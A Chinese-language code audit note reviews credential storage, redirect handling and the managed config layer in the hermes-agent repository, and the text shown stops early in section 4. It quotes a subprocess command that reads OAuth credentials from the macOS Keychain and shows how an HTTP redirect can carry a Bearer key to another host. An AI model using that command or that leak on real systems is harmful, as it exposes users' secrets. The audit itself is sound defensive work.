# R8D 底稿 · 簇 C —— 凭据生命周期与供应链安全

> 研究对象:`/home/user/hermes-agent` @ `863e31318553cda8ad61df681d08175364d4164b`(只读)。
> 溯源约定:凡对代码行为的断言,锚点 `路径:行号 @ 863e313` **单独成行、置于代码块之前**;
> 围栏块内为基线源码逐字摘录,```text/console/verify``` 围栏为作者声明的非源码。
> 本轮环境:venv 87 个包(`pip list` 去表头 = 87,`site-packages/*.dist-info` = 87),
> Python 3.11.15,容器**以 root 运行**、**无 IPv6**、**离线**。

本簇 10 个文件 / 4,101 行:

| 文件 | 行数 | 一句话 |
|---|---|---|
| `hermes_cli/secrets_cli.py` | 745 | `hermes secrets bitwarden …` 的 CLI |
| `hermes_cli/copilot_auth.py` | 693 | GitHub Copilot 设备码登录 + JWT 交换 + 磁盘缓存 |
| `hermes_cli/security_audit.py` | 589 | 按需供应链审计(OSV.dev) |
| `hermes_cli/onepassword_secrets_cli.py` | 530 | `hermes secrets onepassword …` 的 CLI |
| `hermes_cli/security_advisories.py` | 453 | 已知投毒包告警目录 + ack 机制 |
| `hermes_cli/security_audit_startup.py` | 285 | 启动期主机安全姿态审计 |
| `hermes_cli/credential_lifecycle.py` | 272 | 跨存储的凭据保存/删除唯一收口 |
| `hermes_cli/managed_scope.py` | 214 | IT 下发、"用户不可改"的配置/env 层 |
| `hermes_cli/mcp_security.py` | 181 | 用户配置的 MCP server 条目安全检查 |
| `hermes_cli/urllib_security.py` | 139 | 带凭据的 stdlib urllib 请求策略 |

---

## 0. 四条"自称"的验收结论(先给答案)

| 自称 | 出处 | 判定 |
|---|---|---|
| "across **every** store Hermes reads" | `credential_lifecycle.py` 模块首行 | **不成立**(严格意义)。它覆盖 3 个存储 + 1 个派生缓存;profile 模式下 `auth.json` 的**全局根副本**读得到、删不掉。见 §2.4 |
| 带凭据请求跨域重定向时凭据**不跟着走** | `urllib_security.py` | **成立,且做得比 stdlib 严**(连非 Authorization 的自定义头也剥)。但**只有 4 个文件、5 处调用**用它,同一文件里的另一个 Bearer 请求就没用。见 §3 |
| "user-immutable" 管理层 | `managed_scope.py` 模块首行 | **不成立**。两个 env 变量各能整层关掉它,其中一个(`PYTEST_CURRENT_TEST`)**任何文档都没提**。见 §4 |
| "never blocks" | `security_audit_startup.py` 模块首行 | **成立**,但代价是:发现 root + 无认证公网端点,后果**只有 gateway.log 里两行 WARNING**;而且**只有 gateway 进程会跑**,CLI 不跑。见 §5 |

---

## 1. 凭据在这个仓库里到底存在哪儿(store 地图)

要判"every store"这条全称断言,先得把面铺开。下面这张表是本节的产出,后面每一节都在验证其中一格。

### 1.1 `credential_lifecycle` 自己声明的三个存储

`hermes_cli/credential_lifecycle.py:1 @ 863e313`

```
"""Unified provider-credential lifecycle across every store Hermes reads.

A provider API key can live in up to THREE stores at once:

    1. ``~/.hermes/.env``                     — the canonical secret store
    2. ``~/.hermes/auth.json`` →
       ``credential_pool.<provider>[*]``      — env-seeded pool entries
       (``source == "env:<VAR>"``) persisted by the pool loader
    3. ``~/.hermes/config.yaml``              — inline mirrors written by the
       custom-endpoint flows (``model.api_key``, ``auxiliary.<task>.api_key``,
       ``custom_providers[*].api_key``)
```

注意标题句(第 1 行)与正文(第 3 行)已经不一致:标题说 "every store",正文说 "up to THREE"。
本节剩下的部分是把"实际有几个"数清楚。

### 1.2 全仓凭据落盘点清单(搜索面写在这里)

搜索面:在基线根执行 `grep -rhoE '"[a-z_\.-]+\.(json|yaml|yml|env|db|txt|enc)"'`,
范围 `hermes_cli/ agent/ gateway/ tools/ hermes_constants.py`,按出现次数排序取前 50;
再对每个疑似凭据文件回查其读写函数。排除:`package.json`/`tsconfig.json` 等前端构建产物、
`*.db`(会话/看板存储,不存 provider key)。得到的凭据类落盘点:

| 落盘点 | 存什么 | `credential_lifecycle` 管不管 |
|---|---|---|
| `~/.hermes/.env` | 全部 env 形状凭据 | ✅ 写/删 |
| `~/.hermes/auth.json` → `credential_pool.<p>[*]` | env 播种条目(`source=="env:VAR"`) | ✅ 删(**仅当前 profile**,见 §2.4) |
| `~/.hermes/auth.json` → `providers.<id>` / OAuth 条目 | OAuth / device_code / 借来的 CLI 凭据 | ❌ **契约上明确不碰** |
| `~/.hermes/auth.json` → `suppressed_sources` | 抑制标记(非凭据) | ✅ 写 |
| `~/.hermes/config.yaml` `model.api_key` / `.api` / `auxiliary.<task>.api_key` / `custom_providers[*].api_key` | 内联镜像 | ✅ 值匹配后改/删 |
| `~/.hermes/provider_models_cache.json` | 派生模型目录(非凭据) | ✅ 清 |
| `~/.hermes/.copilot_jwt.json` | 交换出来的 Copilot JWT | ❌ 只有 `evict_cached_exchanged_token` 单独清 |
| `~/.hermes/.anthropic_oauth.json` / `~/.claude/.credentials.json` | Anthropic/Claude Code OAuth | ❌(OAuth,契约排除) |
| macOS Keychain `Claude Code-credentials` | Claude Code OAuth | ❌(**只读别家的**,契约排除,见 §1.3) |
| Bitwarden 磁盘缓存 `bws_cache.json` / `bws_cache.enc.json` | 上游保管库拉回来的一批 secret | ❌(上游,由 `hermes secrets … token` 的 `clear_caches()` 管) |
| `/etc/hermes/.env`(managed) | IT 下发的 env | ❌ **被守卫拒绝改**(见 §4.3) |
| `auth.json` 的**全局根副本**(profile 模式) | 同 `credential_pool` | ❌ **读得到、删不掉** —— 本簇最重要的缺口,见 §2.4 |

### 1.3 "系统钥匙串"这条线索的定论

任务书里假设凭据可能存在"系统钥匙串"。**结论:hermes 没有把自己的凭据写进任何 OS keystore。**

搜索面:`grep -rln "import keyring\|keyring\.\|Keychain\|security find-generic-password\|libsecret\|wincred" --include=*.py .`
(全仓,排除 `tests/`),命中 7 个文件;逐个回查后,只有 1 处是真正的 keystore 读:
`agent/anthropic_adapter.py` 用 macOS `security find-generic-password` **读 Claude Code 写进去的**条目;
其余 6 处是注释/路径常量(如 `gateway/platforms/base.py` 的 egress 屏蔽路径 `"Library/Keychains"`)。

`agent/anthropic_adapter.py:955 @ 863e313`

```
    """Read Claude Code OAuth credentials from the macOS Keychain.

    Claude Code >=2.1.114 stores credentials in the macOS Keychain under the
    service name "Claude Code-credentials" rather than (or in addition to)
    the JSON file at ~/.claude/.credentials.json.
```

`agent/anthropic_adapter.py:971 @ 863e313`

```
        result = subprocess.run(
            ["security", "find-generic-password",
             "-s", "Claude Code-credentials",
             "-w"],
```

这是**借用**(borrowed)第三方 CLI 的凭据,`credential_lifecycle` 的契约里 `claude_code` 明确在"永不触碰"名单上,
所以这不构成"漏掉一个存储",而是"故意不管的存储"。作者自己在 secret-source 包里也承认 OS keystore 没做:

`agent/secret_sources/__init__.py:25 @ 863e313`

```
The bundled set is deliberately closed (policy mirrors memory
providers): new third-party secret managers ship as standalone plugin
repos that subclass ``SecretSource`` and register through
``PluginContext.register_secret_source()`` — they are NOT added to this
package.  A generic ``command`` source is a possible future exception;
OS keystores (Keychain/DPAPI/libsecret) are under discussion.
"""
```

**这段话的后半句(OS keystores under discussion)为真;前半句(command source 是"可能的未来例外")为假** ——
`CommandSource` 已经在树里(`agent/secret_sources/command.py`,501 行)且被注册为内建:

`agent/secret_sources/registry.py:180 @ 863e313`

```
    try:
        from agent.secret_sources.command import CommandSource

        register_source(CommandSource())
    except Exception:  # noqa: BLE001 — never block startup
        logger.warning("Failed to register bundled command secret source",
                       exc_info=True)
```

→ 记 **▲1**(见 §12)。按 CLAUDE.md"整句/整段一并判定"的要求:这一整段挂在 `__init__.py` 模块 docstring
的"Currently bundled:"清单之后,清单本身也只列了 bitwarden / onepassword 两项,同样漏掉 command。
同一句话在 registry 里还有一份拷贝,而且连 "once it lands" 都还没改 —— 1Password 早已落地:

`agent/secret_sources/registry.py:19 @ 863e313`

```
Plugins register additional sources via
``PluginContext.register_secret_source()`` which lands in
:func:`register_source`.  In-tree sources are registered lazily by
:func:`_ensure_builtin_sources` — the set of bundled sources is
deliberately closed (Bitwarden, and 1Password once it lands); new
third-party backends ship as standalone plugin repos implementing
:class:`agent.secret_sources.base.SecretSource`.
"""
```

对照:**网站文档是对的**,它把 command 列为受支持来源。

`website/docs/user-guide/secrets/index.md:9 @ 863e313`

> - [Command helper](./command) — any CLI vault (`keepassxc-cli`, `secret-tool`, `pass`, custom scripts) via a user-configured helper that prints `KEY=VALUE` lines.

但**同一页**在"## Adding your own backend"标题下又写:

`website/docs/user-guide/secrets/index.md:50 @ 863e313`

> The bundled set is deliberately closed (same policy as memory providers): Bitwarden and 1Password ship in-tree. Everything else — Infisical, Proton Pass, HashiCorp Vault, AWS Secrets Manager, OS keystores — belongs in plugin repos; share them in the Nous Research Discord (`#plugins-skills-and-skins`).

同一篇文档自相矛盾,且下半句与代码矛盾 → 并入 **▲1**。

---

## 2. `credential_lifecycle.py` —— 三个存储的收口

### 2.1 它解决的问题(先讲场景)

用户在桌面 dashboard 上点"删除 OpenRouter 的 key"。历史上这个按钮只删 `~/.hermes/.env` 一处。结果:

- `auth.json` 里那条 `source == "env:OPENROUTER_API_KEY"` 的 pool 条目还在,pool loader 是**只增不减**的,
  于是模型选择器里这个 provider 一直在,重启也不消失(#51071 / #59761);
- 如果用户是**改** key 而不是删,`config.yaml` 里 `model.api_key` 那份旧镜像还在,而它在构造 client 时
  **优先级高于 env**,于是用户看到 UI 显示新 key、请求却一直 401(#62269)。

模块 docstring 把这两条因果写得很清楚,这也是全仓少见的"把 bug family 写进模块头"的写法。

### 2.2 删除路径:四步

`hermes_cli/credential_lifecycle.py:245 @ 863e313`

```
def remove_provider_env_credential(env_var: str) -> Dict[str, Any]:
    """Remove a credential from EVERY store it lives in.

    Clears the ``.env`` entry (and process env), prunes env-seeded
    ``credential_pool`` entries, drops the affected providers' model-cache
    rows, and removes any config.yaml mirror holding the same value.
    OAuth/device-code/manual credentials are preserved (see module docstring).

    ``found`` is True when ANY store held the credential — callers that
    previously 404'd on ".env miss" should key off this instead so a stale
    pool-only entry can still be cleaned up through the same button.
    """
    from hermes_cli.config import load_env, remove_env_value

    old_value = load_env().get(env_var)
    removed_from_env = remove_env_value(env_var)
    refs = purge_env_credential_references(env_var)
    config_scrubbed = _scrub_config_yaml_mirrors(old_value, None) if old_value else []
```

三个设计点值得抄:

**(a) pool 剪枝按 `source` 字符串精确匹配,横跨所有 provider。** 因为 `env:GITHUB_TOKEN` 这种共享变量
可能同时播种了 copilot 和别的 provider,按 provider 遍历反而会漏。

`hermes_cli/credential_lifecycle.py:78 @ 863e313`

```
    from hermes_cli.auth import _auth_store_lock, _load_auth_store, _save_auth_store

    source = f"env:{env_var}"
    pruned: List[str] = []
    with _auth_store_lock():
        auth_store = _load_auth_store()
        pool = auth_store.get("credential_pool")
        if not isinstance(pool, dict):
            return pruned
        changed = False
        for provider in list(pool.keys()):
            entries = pool[provider]
            if not isinstance(entries, list):
                continue
            kept = [
                entry
                for entry in entries
                if not (isinstance(entry, dict) and entry.get("source") == source)
            ]
            if len(kept) == len(entries):
                continue
            changed = True
            pruned.append(provider)
            if kept:
                pool[provider] = kept
            else:
                del pool[provider]
        if changed:
            _save_auth_store(auth_store)
    return pruned
```

**这是 OAuth 保全契约的实现处**:判据是 `entry.get("source") == "env:<VAR>"`,一个**精确等值**比较。
`device_code` / `manual*` / `gh_cli` / `claude_code` / `oauth` 这些 source 值天然不等,于是"删 API key
不会顺手撤销同一个 provider 的 OAuth 授权"。用**白名单式的精确等值**而不是"看起来像 env 的都删",
是这个契约唯一的强制机制。

**(b) config.yaml 镜像按"值相等"才动。** 不是按 key 名扫,而是证明这条配置**装的就是刚变的那个凭据**:

`hermes_cli/credential_lifecycle.py:110 @ 863e313`

```
def _scrub_config_yaml_mirrors(old_value: str, new_value: str | None) -> List[str]:
    """Reconcile config.yaml api_key mirrors that hold ``old_value``.

    Value-matched on purpose: we only touch a config entry when it provably
    holds the SAME credential that just changed in ``.env`` — an independent
    key the user configured for a different endpoint is left alone.
```

**(c) 写 config 前先做可读性守卫。** 这正是 CLAUDE.md 里 R8B "H-7 负结论"教训点名的那道闸:

`hermes_cli/credential_lifecycle.py:172 @ 863e313`

```
    if touched:
        require_readable_config_before_write(config_path)
        atomic_yaml_write(config_path, user_config, sort_keys=False)
    return touched
```

而且它读的是 **RAW 用户配置**(`fast_safe_load(open(config_path))`),不是 defaults-merged 视图,
所以回写不会把默认值烤进用户文件。**本模块不是 H-7 那个洞。**

**(d) 删除要"粘住"。** 只删 `.env` 不够 —— shell 里还导出着同名变量的话,下一次 `load_pool()` 又会播种回来。
所以再打一个抑制标记:

`hermes_cli/credential_lifecycle.py:187 @ 863e313`

```
    pruned = _prune_env_pool_entries(env_var)
    providers = sorted(set(pruned) | set(_providers_for_env_var(env_var)))
    # Make the removal sticky the same way `hermes auth remove` does: a
    # lingering shell export (or another live process's os.environ) would
    # otherwise re-seed the pool entry on the next load_pool(). The matching
    # save path lifts the suppression on an explicit re-add.
    try:
        from hermes_cli.auth import suppress_credential_source

        for provider in providers:
            suppress_credential_source(provider, f"env:{env_var}")
    except Exception:
        pass
```

抑制标记本身落在 auth.json 的 `suppressed_sources` 里:

`hermes_cli/auth.py:1717 @ 863e313`

```
def suppress_credential_source(provider_id: str, source: str) -> None:
    """Mark a credential source as suppressed so it won't be re-seeded."""
    with _auth_store_lock():
        auth_store = _load_auth_store()
        suppressed = auth_store.setdefault("suppressed_sources", {})
        provider_list = suppressed.setdefault(provider_id, [])
        if source not in provider_list:
            provider_list.append(source)
        _save_auth_store(auth_store)
```

对称地,保存路径会**解除**抑制,让"UI 上重新添加"等价于 `hermes auth add`:

`hermes_cli/credential_lifecycle.py:234 @ 863e313`

```
    try:
        from hermes_cli.auth import unsuppress_credential_source

        for provider in _providers_for_env_var(env_var):
            unsuppress_credential_source(provider, f"env:{env_var}")
    except Exception:
        pass
```

### 2.3 谁真的走了这个收口

搜索面:`grep -rn "credential_lifecycle\|save_provider_env_credential\|remove_provider_env_credential\|purge_env_credential_references" --include=*.py --include=*.ts --include=*.tsx .`(全仓)。
非测试调用点共 **7 个**,分属 3 个界面:

| 界面 | 位置 | 动作 |
|---|---|---|
| CLI `hermes config set` | `hermes_cli/config.py:4076`、`:4862` | save |
| CLI `hermes config unset` | `hermes_cli/config.py:5087` | remove |
| dashboard `PUT/DELETE /api/env` | `hermes_cli/web_server.py:7113`、`:7581` | save / remove |
| TUI-gateway RPC | `tui_gateway/methods_complete.py:393`、`:458` | save / remove |

dashboard 侧把"为什么必须走收口"直接写在调用处:

`hermes_cli/web_server.py:7105 @ 863e313`

```
        with _profile_scope(body.profile or profile):
            # Unified credential lifecycle: writes .env AND reconciles any
            # config.yaml mirror still holding the previous value of this var
            # (model.api_key / auxiliary.*.api_key / custom_providers[*]),
            # so a rotation can't leave a stale higher-precedence copy that
            # keeps authenticating with the old key (#62269).
            from hermes_cli.credential_lifecycle import save_provider_env_credential

            result = save_provider_env_credential(body.key, body.value)
        return result
    except ValueError as exc:
```

TUI-gateway 侧同理:

`tui_gateway/methods_complete.py:388 @ 863e313`

```
        # so any stale config.yaml mirror of the previous key (model.api_key,
        # custom_providers[*].api_key) is rotated in the same action (#62269).
        env_var = pconfig.api_key_env_vars[0]
        from hermes_cli.credential_lifecycle import save_provider_env_credential

        save_provider_env_credential(env_var, api_key)
        # Also set in current process so the refreshed inventory sees it.
```

CLI 侧:

`hermes_cli/config.py:5081 @ 863e313`

```
    if _is_env_config_key(key):
        # Unified lifecycle: prune env-seeded credential_pool entries and
        # model-cache rows too, so `hermes config unset <KEY>` fully removes
        # the provider instead of leaving it resurrectable (#51071 family).
        from hermes_cli.credential_lifecycle import remove_provider_env_credential

        if not remove_provider_env_credential(key.upper()).get("found"):
```

也就是说 docstring 里那句 "every surface that saves or removes a provider credential should route through …"
在**这三个界面上**确实做到了。**但注意它是"should",不是被任何机制强制的** —— 没有 lint、没有测试、
没有运行时断言阻止第四个界面直接调 `save_env_value`。事实上 `secrets_cli.py` 和 `onepassword_secrets_cli.py`
(本簇内!)存 token 时就是直接调 `save_env_value`,绕开了收口(见 §9.3)。

### 2.4 ■ 缺口:profile 模式下,pool 的**全局根副本**读得到、删不掉

这是本簇最重要的一条。

`_prune_env_pool_entries` 用的是 `_load_auth_store()` / `_save_auth_store()`,两者都指向**当前 profile 的**
`auth.json`。而读路径不是 —— `load_pool()` 走 `read_credential_pool()`:

`agent/credential_pool.py:3084 @ 863e313`

```
def load_pool(provider: str) -> CredentialPool:
    provider = (provider or "").strip().lower()
    raw_entries = read_credential_pool(provider)
    disk_ids = {
        entry.get("id")
        for entry in raw_entries
        if isinstance(entry, dict) and entry.get("id")
```

而 `read_credential_pool` 在 profile 模式下会**回落到全局根 `auth.json`**:

`hermes_cli/auth.py:1536 @ 863e313`

```
def read_credential_pool(provider_id: Optional[str] = None) -> Dict[str, Any]:
    """Return the persisted credential pool, or one provider slice.

    In profile mode, the profile's credential pool is authoritative. If a
    provider has no entries in the profile, entries from the global-root
    ``auth.json`` are used as a read-only fallback — so workers spawned in a
    profile can see providers that were only authenticated at global scope.
```

`hermes_cli/auth.py:1575 @ 863e313`

```
    provider_entries = pool.get(provider_id)
    if isinstance(provider_entries, list) and provider_entries:
        return list(provider_entries)
    # Profile has no entries for this provider — fall back to global.
    global_entries = global_pool.get(provider_id)
    return list(global_entries) if isinstance(global_entries, list) else []
```

而查询侧同样只读当前 profile 的 store(没有全局回落):

`hermes_cli/auth.py:1728 @ 863e313`

```
def is_source_suppressed(provider_id: str, source: str) -> bool:
    """Check if a credential source has been suppressed by the user."""
    try:
        auth_store = _load_auth_store()
        suppressed = auth_store.get("suppressed_sources", {})
        return source in suppressed.get(provider_id, [])
    except Exception:
        return False
```

**后果链**:用户在 profile `milla` 里通过 dashboard 删掉 `OPENROUTER_API_KEY` →
`_prune_env_pool_entries` 在 profile 的 auth.json 里找不到条目(`pruned == []`)→
`suppress_credential_source` 把抑制标记写进 **profile 的** auth.json →
但抑制标记只在**播种**时被查(`_seed_from_env` 里 `_is_source_suppressed`),
**对已经落盘的条目不做过滤** → `read_credential_pool("openrouter")` 发现 profile 里 0 条,回落全局 →
那条 `source == "env:OPENROUTER_API_KEY"`、`access_token` 装着真 key 的条目**照样返回**,provider 照样可用。

这正是模块声称已关闭的 #51071 形状,只是被 profile 边界重新打开了。

抑制标记只管播种、不管落盘条目,可以从 `_seed_from_env` 里那两个 `_is_source_suppressed` 的位置直接读出:

`agent/credential_pool.py:2948 @ 863e313`

```
    for env_var in env_vars:
        # Prefer ~/.hermes/.env over os.environ
        token = _get_env_prefer_dotenv(env_var)
        if not token:
            continue
        source = f"env:{env_var}"
        if _is_source_suppressed(provider, source):
            continue
```

→ 记 **■1**。同时这是 "across every store" 全称断言**不成立**的直接证据:
第 2 个存储在 profile 模式下是**两个物理文件**,只写其中一个。

**复现条件**(移交项 §13 会带走):`get_hermes_home()` 指向 `<root>/profiles/<name>`、
且目标 provider 在 profile 的 pool 里 **0 条**、在全局根 pool 里有 `env:<VAR>` 条目。
`_global_auth_file_path()` 只有在 profile 家目录 ≠ 全局根时才返回非 None,所以经典单家目录模式不受影响。

### 2.5 保密契约

模块 docstring 说 "no function in this module logs, prints, or returns a credential value.
Results carry key NAMES and config PATHS only."。逐个函数核过:
`_scrub_config_yaml_mirrors` 返回 `touched`(点分路径列表),`save_/remove_provider_env_credential`
返回 `{"ok","key","config_updates"/"removed"/"pool_pruned"/"providers"/"config_scrubbed","found"}`,
全是名字。模块内**零 print / 零 logger 调用**。搜索面:对该文件全文 grep `print(`、`logger`、`logging`,
均 0 命中。**契约成立。**

---

## 3. `urllib_security.py` —— 带凭据请求的重定向策略

### 3.1 场景:一次 `/models` 探测怎么把 key 送给第三方

用户在 `hermes model` 里填了一个自建 endpoint 和它的 key。hermes 用 stdlib `urllib` GET
`{base_url}/models`,带 `Authorization: Bearer <key>`。这个 endpoint 回 302,`Location` 指向另一台主机。
**Python 3.11 的 stdlib 会原样把 Authorization 带到新主机**:

`/home/user/hermes-venv/lib/python3.11/urllib/request.py`(stdlib,非基线,故不带基线锚点)

```text
        CONTENT_HEADERS = ("content-length", "content-type")
        newheaders = {k: v for k, v in req.headers.items()
                      if k.lower() not in CONTENT_HEADERS}
        return Request(newurl,
                       headers=newheaders,
                       origin_req_host=req.origin_req_host,
                       unverifiable=True)
```

只剥 `content-length` / `content-type`,凭据头一个不剥。我在本机(两个 127.0.0.1 监听口,不出网)
跑了对照实验:

> **R11B 更正**:本块的脚本只存在于当轮会话的 scratchpad(原路径含会话标识,已抹去)、**从未落库**,重跑无法复现,因此它不是「shell 命令即证据」意义上的可重跑证据 —— 由 ```verify 改标 ```console。**结论本身不变**,依据仍是块内输出与同节的行号锚点。

```console
cd /home/user/hermes-agent && /home/user/hermes-venv/bin/python \
  <scratchpad>/redirect_leak_demo.py
# python: 3.11.15
# plain urllib.request.urlopen -> sink saw Authorization = 'Bearer AI_GATEWAY_SECRET'
# open_credentialed_url        -> sink saw Authorization = None
```

(脚本在 scratchpad,内容:起两个本地 HTTP server,前者 302 到后者,后者记录收到的头;
分别用裸 `urlopen` 和 `open_credentialed_url` 各跑一次。)

### 3.2 设计:三层,一层比一层"后"

**第一层:重定向时按源(scheme, host, port)比对,跨源就按白名单剥头。**

`hermes_cli/urllib_security.py:31 @ 863e313`

```
class SafeCredentialRedirectHandler(urllib.request.HTTPRedirectHandler):
    """Preserve request headers only while redirects stay on one origin."""

    def __init__(
        self,
        original_url: str,
        *,
        cross_origin_safe_headers: Iterable[str] = _CROSS_ORIGIN_SAFE_HEADERS,
    ) -> None:
        self._original_origin = url_origin(original_url)
        self._cross_origin_safe_headers = frozenset(
            str(name).lower() for name in cross_origin_safe_headers
        )

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        # Let urllib enforce status/method semantics first (notably 307/308).
        redirected = super().redirect_request(req, fp, code, msg, headers, newurl)
        if redirected is None:
            return None

        resolved_url = urllib.parse.urljoin(req.full_url, newurl)
        if url_origin(resolved_url) != self._original_origin:
            # Use an allowlist rather than guessing credential header names.
            # normalize_extra_headers permits arbitrary secret-bearing names.
            for name, _value in list(redirected.header_items()):
                if name.lower() not in self._cross_origin_safe_headers:
                    redirected.remove_header(name)
        return redirected
```

关键取舍写在注释里:**用白名单,不猜凭据头名字**。因为 hermes 允许用户给自定义 endpoint 配任意
额外请求头(`normalize_extra_headers`),`CF-Access-Client-Secret`、`X-Tenant-Auth` 这种名字
黑名单永远追不上。放行清单只有两个:

`hermes_cli/urllib_security.py:11 @ 863e313`

```
# Headers safe to forward to a different origin. Everything else is dropped:
# custom provider headers routinely carry credentials under arbitrary names.
_CROSS_ORIGIN_SAFE_HEADERS = frozenset({"accept", "user-agent"})
_DEFAULT_PORTS = {"http": 80, "https": 443}
```

源的定义是 (scheme, hostname, **有效端口**),端口不同即跨源:

`hermes_cli/urllib_security.py:17 @ 863e313`

```
def url_origin(url: str) -> tuple[str, str, int | None]:
    """Return a normalized (scheme, hostname, effective port) origin."""
    parsed = urllib.parse.urlparse(url)
    scheme = (parsed.scheme or "").lower()
    # Accessing ``parsed.port`` validates malformed/non-numeric ports. Let the
    # ValueError fail the request closed instead of collapsing it to a default.
    port = parsed.port
    return (
        scheme,
        (parsed.hostname or "").lower().rstrip("."),
        port if port is not None else _DEFAULT_PORTS.get(scheme),
    )
```

两个细节值得抄:`rstrip(".")` 消掉 FQDN 尾点(`api.x.com.` 与 `api.x.com` 是同一台主机,
但字符串不等 —— 不归一化会把同源误判成跨源,虽然那是"更安全"的方向,却会无谓地打断合法请求);
以及**故意让畸形端口抛 ValueError**(fail closed)而不是塌回默认端口。

**第二层:一个跑在所有 request processor 之后的净化器。** 因为 urllib 的 processor 链可能被应用
装了别的东西(cookie 处理器、埋点),它们会在重定向 Request 造好之后再往里塞头:

`hermes_cli/urllib_security.py:61 @ 863e313`

```
class _CrossOriginRequestSanitizer(urllib.request.BaseHandler):
    """Strip headers after installed request processors have run."""

    # Request processors run in ascending order. Keep this last so an installed
    # cookie/auth/instrumentation processor cannot re-add a secret after the
    # redirect handler sanitizes the new Request.
    # Infinity is greater than every finite handler order. If an installed
    # processor also uses infinity, stable sorting keeps this appended handler
    # after it, so sanitization still owns the final request boundary.
    handler_order = float("inf")  # type: ignore[assignment]
```

**第三层:把 opener 的 `addheaders` 挪到首个请求上,再清空。** 这是最容易被忽略的一条:
`OpenerDirector.open()` 是在 processor 之后才注入 `addheaders` 的,所以净化器管不到它。

`hermes_cli/urllib_security.py:99 @ 863e313`

```
    secured = urllib.request.build_opener(*handlers)
    # OpenerDirector injects addheaders after request processors, which would
    # bypass the sanitizer on redirects. Carry them on the initial request
    # instead, then leave the rebuilt opener's late-injection list empty.
    setattr(
        secured,
        "_hermes_initial_addheaders",
        list(getattr(installed, "addheaders", ())),
    )
    secured.addheaders = []
    return secured
```

**保留应用已装策略,只换重定向那一块**(代理、TLS、cookie、自定义协议 handler 都不动):

`hermes_cli/urllib_security.py:86 @ 863e313`

```
def _secure_opener_from_installed_policy(original_url: str):
    """Clone the installed opener's handlers, replacing redirect policy only."""
    installed = getattr(urllib.request, "_opener", None)
    if installed is None:
        installed = urllib.request.build_opener()

    handlers = [
        copy.copy(handler)
        for handler in getattr(installed, "handlers", ())
        if not isinstance(handler, urllib.request.HTTPRedirectHandler)
    ]
```

**`opener_factory` 是显式测试缝,而不是"检测到 urlopen 被 patch 就关安全"**:

`hermes_cli/urllib_security.py:112 @ 863e313`

```
def open_credentialed_url(
    request: urllib.request.Request,
    *,
    timeout: float,
    opener_factory: Callable[..., Any] | None = None,
):
    """Open a request without forwarding credentials across origins.

    The default preserves an application-installed opener's proxy, TLS,
    cookies, custom protocol handlers, and instrumentation while replacing its
    redirect handler. ``opener_factory`` is an explicit test seam; security is
    never disabled based on global ``urlopen`` identity.
    """
```

**多跳不复活**:头是从 Request 对象上**永久移除**的,所以 A→B→A 回到原点也不会把凭据加回来。
测试把这条钉死了(`test_multihop_redirects_never_resurrect_credentials`,见 §11.3)。

### 3.3 ■ 缺口:这条策略只覆盖 4 个调用点,同一个文件里的另一个 Bearer 请求就没用

搜索面:`grep -rn "open_credentialed_url|urllib_security|SafeCredentialRedirectHandler|url_origin" <baseline>`
(全仓,不限文件类型)。非测试调用点共 **5 处、分布在 4 个文件**:

`providers/base.py:232`、`hermes_cli/models.py:41`、`hermes_cli/azure_detect.py:163` 与 `:274`、`plugins/model-providers/anthropic/__init__.py:32`。

正确用法长这样 —— provider 目录探测:

`providers/base.py:216 @ 863e313`

```
        import urllib.request

        from hermes_cli.urllib_security import open_credentialed_url

        req = urllib.request.Request(url)
        if api_key:
            req.add_header("Authorization", f"Bearer {api_key}")
        req.add_header("Accept", "application/json")
```

以及 `models.py` 里那个只有三行的包装器:

`hermes_cli/models.py:39 @ 863e313`

```
def _urlopen_model_catalog_request(req: urllib.request.Request, *, timeout: float):
    """Open catalog requests without forwarding headers across origins."""
    return open_credentialed_url(req, timeout=timeout)
```

而全仓裸 `urllib.request.urlopen(` 的调用点(搜索面:`grep -rn "urlopen(" --include=*.py .`,
排除 `tests/` 与 `urllib_security.py` 自身)有 **60+ 处**。其中带凭据的至少包括下面这一处 ——
**它就在 `models.py` 里,和那个安全包装器同一个文件**:

`hermes_cli/models.py:4605 @ 863e313`

```
    url = base_url.rstrip("/") + "/models"
    headers: dict[str, str] = {
        "Authorization": f"Bearer {api_key}",
        "User-Agent": _HERMES_USER_AGENT,
    }
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            data = json.loads(resp.read().decode())
```

`api_key` 来自 `AI_GATEWAY_API_KEY`,`base_url` 来自 `AI_GATEWAY_BASE_URL`(env 可覆盖)。
也就是说**目标主机是配置可控的** —— 一个被改过的 base_url(或被入侵的网关)只要回一个 302,
就能把 AI Gateway 的 key 拿走。§3.1 的实验用的正是这个头。

另一处是 Copilot 的 token 交换,`Authorization: token <raw GitHub token>`:

`hermes_cli/copilot_auth.py:530 @ 863e313`

```
    req = urllib.request.Request(
        _TOKEN_EXCHANGE_URL,
        method="GET",
        headers={
            "Authorization": f"token {raw_token}",
            "User-Agent": _EXCHANGE_USER_AGENT,
            "Accept": "application/json",
            "Editor-Version": _EDITOR_VERSION,
        },
    )
```

`hermes_cli/copilot_auth.py:551 @ 863e313`

```
    for attempt in range(_EXCHANGE_MAX_ATTEMPTS):
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                data = json.loads(resp.read().decode())
            break
```

这一处的 URL 是硬编码常量 `https://api.github.com/copilot_internal/v2/token`,风险比上面低一档,
但用的仍是裸 opener,不受策略保护。

→ 记 **■2**(上面那处 AI Gateway 的 Bearer 请求:目标主机配置可控)、**◇1**(策略存在但覆盖率 4/60+,
没有任何机制阻止新调用点绕过)。

---

## 4. `managed_scope.py` —— "user-immutable" 到底靠什么

### 4.1 它是什么(先和另一个"managed"划清界线)

`hermes_cli/managed_scope.py:1 @ 863e313`

```
"""Managed scope — IT-pushed, user-immutable config & env layer.

A system-level directory (default ``/etc/hermes``, root-owned and not
user-writable) supplies ``config.yaml`` and ``.env`` values that WIN over the
user's ``~/.hermes/config.yaml`` and ``~/.hermes/.env`` on a per-leaf-key basis.

This is DISTINCT from ``hermes_cli.config.is_managed()`` / ``HERMES_MANAGED``,
which is a coarse package-manager write-lock (declarative-distro / formula
installs). That lock blocks all mutation; this layer injects specific immutable
values. The two are independent and may coexist.

v1 enforcement is filesystem permissions only — see
``docs/design/managed-scope.md`` §7. v1 is Linux/POSIX-first; ``get_managed_dir()``
is the single seam for adding macOS / Windows native locations later.
```

两个"managed"必须分清:`HERMES_MANAGED` 是**粗粒度写锁**(NixOS / brew 装的,禁止一切改配置);
managed scope 是**按叶子键注入不可变值**。二者独立、可共存。

